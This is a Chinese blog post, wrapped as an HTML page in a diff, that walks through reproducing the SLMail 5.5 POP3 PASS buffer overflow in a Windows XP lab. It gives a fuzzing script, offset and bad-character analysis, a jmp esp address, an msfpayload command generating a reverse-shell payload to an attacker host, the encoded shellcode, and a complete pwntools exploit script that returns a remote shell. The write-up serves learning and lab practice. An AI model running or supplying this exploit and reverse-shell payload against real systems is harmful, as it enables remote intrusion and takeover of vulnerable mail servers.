@@ -1,0 +1,580 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="在我大二时任技术交流协会信安部部长时我曾给学弟学妹们介绍过这个关于SLMail的缓冲区溢出漏洞，给他们讲的原因是想扩展一下他们的知识面，现在我再重新温习一下这个漏洞来跟现阶段学习的Linux缓冲区漏洞做一个对比
+
+环境搭建首先需要搭建实验环境，系统可选用Windows_XP，因为Windows7及以上的系统内置了多种安全措施使得此漏洞难以利用，本实验用到的软件及下载链接如下：
+SLMail 5.5">
+  <meta name="author" content="Hvnt3r">
+  <meta name="keywords" content="CTF, WEB安全, 二进制安全">
+  
+  <title>Windows系统安全之SLMail缓冲区溢出漏洞复现 - Hvnt3r&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/xcode.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.hvnt3r.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Hvnt3r's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Hvnt3r</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Windows系统安全之SLMail缓冲区溢出漏洞复现">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-10-17 10:01" pubdate>
+        2018年10月17日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      35
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Windows系统安全之SLMail缓冲区溢出漏洞复现</h1>
+            
+            <div class="markdown-body">
+              <p>在我大二时任技术交流协会信安部部长时我曾给学弟学妹们介绍过这个关于<code>SLMail</code>的缓冲区溢出漏洞，给他们讲的原因是想扩展一下他们的知识面，现在我再重新温习一下这个漏洞来跟现阶段学习的Linux缓冲区漏洞做一个对比</p>
+<hr>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先需要搭建实验环境，系统可选用<code>Windows_XP</code>，因为Windows7及以上的系统内置了多种安全措施使得此漏洞难以利用，本实验用到的软件及下载链接如下：</p>
+<p><a target="_blank" rel="noopener" href="https://slmail.software.informer.com/download/">SLMail 5.5.0 Mail Server</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.softpedia.com/dyn-postdownload.php/dfb40d15ed797f293c5e48eb28f9a891/5bc69b64/277f7/4/1">ImmunityDebugger_1_85_setup</a></p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/corelan/mona/master/mona.py">mona.py</a></p>
+<span id="more"></span>
+
+<p>其中软件的安装都按照默认安装即可，mona.py需要放到Immunity Debugger的安装目录中：<code>\Immunity Inc\Immunity Debugger\PyCommands</code></p>
+<p>至此环境配置完成，查看一下邮件的相关服务是否已经开启</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -nao<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2018/10/17/5bc69b7eaf1d5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">win+r<br>向运行窗口中输入services.msc<br>查看相关服务的状态<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2018/10/17/5bc69cfd8cafe.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到服务已经启动</p>
+<h2 id="附加进程到调试器"><a href="#附加进程到调试器" class="headerlink" title="附加进程到调试器"></a>附加进程到调试器</h2><p>此时打开<code>Immunity Debugger</code>，点击菜单栏中的<code>File</code>选中<code>Attach</code></p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6a007a10ea.png" srcset="/img/loading.gif" lazyload></p>
+<p>选择如图的进程，此进程监听的端口包含110端口</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6a06490046.png" srcset="/img/loading.gif" lazyload></p>
+<p>附加此进程后调试器界面如下</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc70c17dfd80.png" srcset="/img/loading.gif" lazyload></p>
+<p>此调试器的各个窗口我就不多介绍了，跟其他调试器大同小异</p>
+<p>附加到进程后此进程会进入暂停状态，需要点击运行按钮使此进程正常进行</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6a14bc24d7.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="远程连接，进行FUZZ测试"><a href="#远程连接，进行FUZZ测试" class="headerlink" title="远程连接，进行FUZZ测试"></a>远程连接，进行FUZZ测试</h2><p>程序正常运行后可以打开Kali Linux对此进程进行远程连接</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc70bec0b148.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们已知此程序的PASS字段存在缓冲区溢出漏洞，现需确认产生溢出的位置，可使用脚本对不同长度的PASS字段的值进行<code>FUZZ</code>测试，当socket连接失败时及代表程序崩溃，已产生溢出，也可以使用<code>pattern_creat</code>产生足够长度的字符串</p>
+<p>FUZZ脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/python</span><br><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>payload=<span class="hljs-string">&quot;PASS &quot;</span><br><span class="hljs-built_in">len</span>=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>	r=remote(<span class="hljs-string">&#x27;192.168.229.134&#x27;</span>,<span class="hljs-number">110</span>)<br>	r.send(<span class="hljs-string">&quot;USER administrator\n&quot;</span>)<br>	<span class="hljs-built_in">print</span> r.recv()<br>	payload+=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">200</span><br>	<span class="hljs-built_in">len</span>+=<span class="hljs-number">200</span><br>	<span class="hljs-built_in">print</span> <span class="hljs-string">&quot;sending payload length: &quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>)<br>	r.send(payload)<br>	r.send(<span class="hljs-string">&quot;\n&quot;</span>)<br>	<span class="hljs-built_in">print</span> r.recv()<br></code></pre></td></tr></table></figure>
+
+<p>运行此脚本后发现当程序发送2600个A之后卡住，回到<code>WindowsXP</code>查看调试器发现程序已经崩溃，且EIP内全部填充为了41即A的Hex ASCII码</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6a780a9413.png" srcset="/img/loading.gif" lazyload></p>
+<p>因此可以确定溢出处位置再2600-2700之间，此时我们需要重新启动此服务，我们可以借助<code>pattern_creat</code>和<code>pattern_offset</code>这两个指令来进一步确定溢出点</p>
+<p>这两个指令可以在<code>/usr/share/metasploit-framework/tools/exploit/</code>目录下找到，也可以直接用GDB</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6a89a1c63d.png" srcset="/img/loading.gif" lazyload></p>
+<p>即可生成2700个具有位置特征的字符串</p>
+<p>使用此字符串填充PASS字段:</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6a9bbe897d.png" srcset="/img/loading.gif" lazyload></p>
+<p>发送后发现程序无回显</p>
+<p>进入Windows_XP中发现程序再次崩溃且EIP寄存器中的内容为<code>45417845</code></p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6aa0b03a5c.png" srcset="/img/loading.gif" lazyload></p>
+<p>而寄存器采用大端序存储数据即高字节保存在内存的低地址，因而EIP寄存器中的内容是<code>45 78 41 45</code>，按照ASCII转化为字符为：<code>ExAE</code></p>
+<p>使用pattern_offset指令来找到这个字符串的位置</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6ab765b443.png" srcset="/img/loading.gif" lazyload></p>
+<p>到这里我们已经确定了溢出产生的位置，另外我们可以看到<code>ESP</code>寄存器中的数据填充着2610个字符之后的字符，选中ESP并点击右键</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6accf34d74.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到如下内容</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6ad01008d5.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以通过起始地址和结束地址计算出ESP寄存器的大小为424字节，完全可以放进去一个<code>shellcode</code>，因此我们可以把<code>Shellcode</code>放到<code>ESP</code>里面，但是我们在编写shellcode的时候需要注意“坏字符”的影响，即有的字符在系统中有不同的涵义如：</p>
+<ol>
+<li><p>NULL byte（0x00）空字符，用于终止字符串的拷贝操作</p>
+</li>
+<li><p>return（0x0D）回车操作，表示POP3 PASS命令输入完成</p>
+</li>
+</ol>
+<p>这些坏字符可能会对shellcode的正常运行和写入造成影响，我们需要把这些坏字符给找出来，通过连续发送0x00~0xff之间的字符，再对比ESP寄存器中的数据，找出如下的坏字符：</p>
+<p><code>0A</code>、<code>0D</code>、<code>00</code></p>
+<p>坏字符找到了我们可以把去掉坏字符的shellcode放到ESP中，但是ESP的地址会发生变化，我们无法通过将ESP的地址EIP中来完成指令的跳转，因此我们需要找到一个跳板，即再内存中寻找一个位置固定的指令<code>jmp esp</code>,然后通过这个指令使得ESP中的代码得到执行，这里就用到mona.py了</p>
+<h2 id="寻找跳板"><a href="#寻找跳板" class="headerlink" title="寻找跳板"></a>寻找跳板</h2><p>使用<code>!mona modules</code>指令查看模块</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6e281777e8.png" srcset="/img/loading.gif" lazyload></p>
+<p>如图示，这是进程的安全措施，我们需要找没有安全措施保护的模块，即值为<code>False</code></p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6e2c141127.png" srcset="/img/loading.gif" lazyload></p>
+<p>其中<code>Rebase</code>表示重启后是否会改变地址、False即不改变；<code>SafeSEH</code>、<code>ASLR</code>、<code>NXCompat</code>这三项都是Windows相关的安全机制；<code>OS Dll</code>表示是否是OS自带的库。即前四列选False，最后一列选True。</p>
+<p>符合以上条件的模块有三个，从这三个模块中逐一尝试寻找<code>jmp esp</code>指令</p>
+<p>可使用<code>/usr/share/metasploit-framework/tools/exploit</code> 目录下的<code>nasm_shell.rb</code>来得到<code>jmp esp</code>的十六进制形式</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6ec438e83a.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过指令</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">!mona find -s &quot;\xff\xe4&quot; -m SLMFC.dll<br></code></pre></td></tr></table></figure>
+
+<p>在<code>SLMFC.dll</code>寻找<code>FFE4</code>，共找到19个结果：</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6ecfe2634f.png" srcset="/img/loading.gif" lazyload></p>
+<p>右键选中并复制此指令的地址</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6eeb31c836.png" srcset="/img/loading.gif" lazyload></p>
+<p>将此地址粘贴到脚本内</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/python</span><br><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>payload=<span class="hljs-string">&quot;PASS &quot;</span><br>r=remote(<span class="hljs-string">&#x27;192.168.229.134&#x27;</span>,<span class="hljs-number">110</span>)<br><span class="hljs-built_in">print</span> r.recv()<br>r.send(<span class="hljs-string">&quot;USER administrator\n&quot;</span>)<br><span class="hljs-built_in">print</span> r.recv()<br>payload+=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">2606</span>+p32(<span class="hljs-number">0x5F4A358F</span>)+<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">400</span>+<span class="hljs-string">&quot;\n&quot;</span><br>r.send(payload)<br><span class="hljs-built_in">print</span> payload<br><span class="hljs-built_in">print</span> r.recv()<br></code></pre></td></tr></table></figure>
+
+<p>运行脚本</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6f6e4d4c49.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://i.loli.net/2018/10/17/5bc6f70b19ecb.png" srcset="/img/loading.gif" lazyload></p>
+<p>此时EIP指向ESP，说明这个地址的<code>jmp esp</code>产生了效果，我们可以将shellcode放入ESP中了</p>
+<h2 id="Shellcode生成及利用"><a href="#Shellcode生成及利用" class="headerlink" title="Shellcode生成及利用"></a>Shellcode生成及利用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"> ⚡ root@kali  /usr/share/framework2  ./msfpayload win32_reverse EXITFUNC=thread LHOST=192.168.229.136 LPORT=6666 R | ./msfencode -b <span class="hljs-string">&quot;\x00\x0a\x0d&quot;</span><br>[*] Using Msf::Encoder::PexFnstenvMov with final size of 310 bytes<br><span class="hljs-string">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x76\x3a\x2f&quot;</span>.<br><span class="hljs-string">&quot;\x54\x83\xeb\xfc\xe2\xf4\x8a\x50\xc4\x19\x9e\xc3\xd0\xab\x89\x5a&quot;</span>.<br><span class="hljs-string">&quot;\xa4\x38\x52\x1e\xa4\x11\x4a\xb1\x53\x51\x0e\x3b\xc0\xdf\x39\x22&quot;</span>.<br><span class="hljs-string">&quot;\xa4\x0b\x56\x3b\xc4\x1d\xfd\x0e\xa4\x55\x98\x0b\xef\xcd\xda\xbe&quot;</span>.<br><span class="hljs-string">&quot;\xef\x20\x71\xfb\xe5\x59\x77\xf8\xc4\xa0\x4d\x6e\x0b\x7c\x03\xdf&quot;</span>.<br><span class="hljs-string">&quot;\xa4\x0b\x52\x3b\xc4\x32\xfd\x36\x64\xdf\x29\x26\x2e\xbf\x75\x16&quot;</span>.<br><span class="hljs-string">&quot;\xa4\xdd\x1a\x1e\x33\x35\xb5\x0b\xf4\x30\xfd\x79\x1f\xdf\x36\x36&quot;</span>.<br><span class="hljs-string">&quot;\xa4\x24\x6a\x97\xa4\x14\x7e\x64\x47\xda\x38\x34\xc3\x04\x89\xec&quot;</span>.<br><span class="hljs-string">&quot;\x49\x07\x10\x52\x1c\x66\x1e\x4d\x5c\x66\x29\x6e\xd0\x84\x1e\xf1&quot;</span>.<br><span class="hljs-string">&quot;\xc2\xa8\x4d\x6a\xd0\x82\x29\xb3\xca\x32\xf7\xd7\x27\x56\x23\x50&quot;</span>.<br><span class="hljs-string">&quot;\x2d\xab\xa6\x52\xf6\x5d\x83\x97\x78\xab\xa0\x69\x7c\x07\x25\x79&quot;</span>.<br><span class="hljs-string">&quot;\x7c\x17\x25\xc5\xff\x3c\xb6\x92\xca\xdc\x10\x52\x35\x5e\x10\x69&quot;</span>.<br><span class="hljs-string">&quot;\xa6\xb5\xe3\x52\xc3\xad\xdc\x5a\x78\xab\xa0\x50\x3f\x05\x23\xc5&quot;</span>.<br><span class="hljs-string">&quot;\xff\x32\x1c\x5e\x49\x3c\x15\x57\x45\x04\x2f\x13\xe3\xdd\x91\x50&quot;</span>.<br><span class="hljs-string">&quot;\x6b\xdd\x94\x0b\xef\xa7\xdc\xaf\xa6\xa9\x88\x78\x02\xaa\x34\x16&quot;</span>.<br><span class="hljs-string">&quot;\xa2\x2e\x4e\x91\x84\xff\x1e\x48\xd1\xe7\x60\xc5\x5a\x7c\x89\xec&quot;</span>.<br><span class="hljs-string">&quot;\x74\x03\x24\x6b\x7e\x05\x1c\x3b\x7e\x05\x23\x6b\xd0\x84\x1e\x97&quot;</span>.<br><span class="hljs-string">&quot;\xf6\x51\xb8\x69\xd0\x82\x1c\xc5\xd0\x63\x89\xea\x47\xb3\x0f\xfc&quot;</span>.<br><span class="hljs-string">&quot;\x56\xab\x03\x3e\xd0\x82\x89\x4d\xd3\xab\xa6\x52\xc0\x9a\x96\x5a&quot;</span>.<br><span class="hljs-string">&quot;\x7c\xab\xa0\xc5\xff\x54&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>使用以上命令生成去除坏字符的shellcode，得到完整的攻击脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/python</span><br><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>shellcode = (<br><span class="hljs-string">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x76\x3a\x2f&quot;</span>+<br><span class="hljs-string">&quot;\x54\x83\xeb\xfc\xe2\xf4\x8a\x50\xc4\x19\x9e\xc3\xd0\xab\x89\x5a&quot;</span>+<br><span class="hljs-string">&quot;\xa4\x38\x52\x1e\xa4\x11\x4a\xb1\x53\x51\x0e\x3b\xc0\xdf\x39\x22&quot;</span>+<br><span class="hljs-string">&quot;\xa4\x0b\x56\x3b\xc4\x1d\xfd\x0e\xa4\x55\x98\x0b\xef\xcd\xda\xbe&quot;</span>+<br><span class="hljs-string">&quot;\xef\x20\x71\xfb\xe5\x59\x77\xf8\xc4\xa0\x4d\x6e\x0b\x7c\x03\xdf&quot;</span>+<br><span class="hljs-string">&quot;\xa4\x0b\x52\x3b\xc4\x32\xfd\x36\x64\xdf\x29\x26\x2e\xbf\x75\x16&quot;</span>+<br><span class="hljs-string">&quot;\xa4\xdd\x1a\x1e\x33\x35\xb5\x0b\xf4\x30\xfd\x79\x1f\xdf\x36\x36&quot;</span>+<br><span class="hljs-string">&quot;\xa4\x24\x6a\x97\xa4\x14\x7e\x64\x47\xda\x38\x34\xc3\x04\x89\xec&quot;</span>+<br><span class="hljs-string">&quot;\x49\x07\x10\x52\x1c\x66\x1e\x4d\x5c\x66\x29\x6e\xd0\x84\x1e\xf1&quot;</span>+<br><span class="hljs-string">&quot;\xc2\xa8\x4d\x6a\xd0\x82\x29\xb3\xca\x32\xf7\xd7\x27\x56\x23\x50&quot;</span>+<br><span class="hljs-string">&quot;\x2d\xab\xa6\x52\xf6\x5d\x83\x97\x78\xab\xa0\x69\x7c\x07\x25\x79&quot;</span>+<br><span class="hljs-string">&quot;\x7c\x17\x25\xc5\xff\x3c\xb6\x92\xca\xdc\x10\x52\x35\x5e\x10\x69&quot;</span>+<br><span class="hljs-string">&quot;\xa6\xb5\xe3\x52\xc3\xad\xdc\x5a\x78\xab\xa0\x50\x3f\x05\x23\xc5&quot;</span>+<br><span class="hljs-string">&quot;\xff\x32\x1c\x5e\x49\x3c\x15\x57\x45\x04\x2f\x13\xe3\xdd\x91\x50&quot;</span>+<br><span class="hljs-string">&quot;\x6b\xdd\x94\x0b\xef\xa7\xdc\xaf\xa6\xa9\x88\x78\x02\xaa\x34\x16&quot;</span>+<br><span class="hljs-string">&quot;\xa2\x2e\x4e\x91\x84\xff\x1e\x48\xd1\xe7\x60\xc5\x5a\x7c\x89\xec&quot;</span>+<br><span class="hljs-string">&quot;\x74\x03\x24\x6b\x7e\x05\x1c\x3b\x7e\x05\x23\x6b\xd0\x84\x1e\x97&quot;</span>+<br><span class="hljs-string">&quot;\xf6\x51\xb8\x69\xd0\x82\x1c\xc5\xd0\x63\x89\xea\x47\xb3\x0f\xfc&quot;</span>+<br><span class="hljs-string">&quot;\x56\xab\x03\x3e\xd0\x82\x89\x4d\xd3\xab\xa6\x52\xc0\x9a\x96\x5a&quot;</span>+<br><span class="hljs-string">&quot;\x7c\xab\xa0\xc5\xff\x54&quot;</span>)<br><br>payload=<span class="hljs-string">&quot;PASS &quot;</span><br>r=remote(<span class="hljs-string">&#x27;192.168.229.134&#x27;</span>,<span class="hljs-number">110</span>)<br><span class="hljs-built_in">print</span> r.recv()<br>r.send(<span class="hljs-string">&quot;USER administrator\n&quot;</span>)<br><span class="hljs-built_in">print</span> r.recv()<br>payload+=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">2606</span>+p32(<span class="hljs-number">0x5F4A358F</span>)+<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">8</span>+shellcode+<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;在shellcode之前添加8个字节以保证shellcode的完整性&#x27;&#x27;&#x27;</span><br>r.send(payload)<br><span class="hljs-built_in">print</span> payload<br><span class="hljs-built_in">print</span> r.recv()<br></code></pre></td></tr></table></figure>
+
+<p>在本地6666端口监听，运行此脚本得到反弹的shell：</p>
+<p><img src="https://i.loli.net/2018/10/17/5bc70bbca55b1.png" srcset="/img/loading.gif" lazyload></p>
+<p>漏洞利用成功！🔥</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li><p>缓冲区溢出是一个经典而危害巨大的漏洞，通过重温这个漏洞，我对Windows的安全机制及漏洞利用方式又有了新的认识。</p>
+</li>
+<li><p>脚本不是拿来复制的，而是要自己学会写，要会根据实际情况灵活变通。</p>
+</li>
+<li><p>细心，再从<code>GitHub</code>上下载<code>mona</code>的时候我用系统自带的笔记本粘贴<code>mona</code>结果在<code>immunity</code>中无法使用，因为粘贴的不完整，需要用<code>notepad</code>等编辑器粘贴</p>
+</li>
+<li><p>安全是一个在不断的技术进步中逐渐完善的点，攻防是在不断地博弈中愈发精彩的舞曲，有趣！🤩</p>
+</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/">Windows系统安全</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">缓冲区溢出</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Slmail/">Slmail</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
